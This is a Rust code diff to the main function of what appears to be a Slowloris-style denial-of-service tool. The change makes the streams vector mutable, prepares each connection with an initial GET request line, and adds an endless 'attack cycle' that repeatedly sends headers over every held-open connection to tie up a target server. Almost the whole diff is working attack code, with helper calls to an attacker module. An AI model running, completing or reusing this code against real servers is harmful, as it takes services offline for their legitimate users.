@@ -21,7 +21,7 @@ fn main() {
 
     // Create connections
     println!("[*] Creating {} connections", args.socket_num);
-    let streams: Vec<TcpStream>;
+    let mut streams: Vec<TcpStream>;
     match attacker::make_connections(addr, args.port, args.socket_num) {
         Ok(s) => {
             println!("[*] Connections successful");
@@ -37,12 +37,28 @@ fn main() {
     };
 
     // Send intial GET request line
-    for mut stream in streams {
-        match attacker::prepare_stream(&mut stream) {
+    println!("[*] Preparing streams");
+    for i in 0..streams.len() {
+        match attacker::prepare_stream(&mut streams[i]) {
             Ok(_) => (),
             Err(e) => {
                 println!("[!] Error while preparing stream ---- {}", e);
                 std::process::exit(1);
+            }
+        }
+    }
+    println!("[*] Prepared streams");
+
+    // Enter attack cycle
+    println!("[*] Attacking");
+    loop {
+        for i in 0..streams.len() {
+            match attacker::send_header(&mut streams[i]) {
+                Ok(_) => (),
+                Err(e) => {
+                    println!("[!] Error during header send ---- {}", e);
+                    std::process::exit(1);
+                }
             }
         }
     }
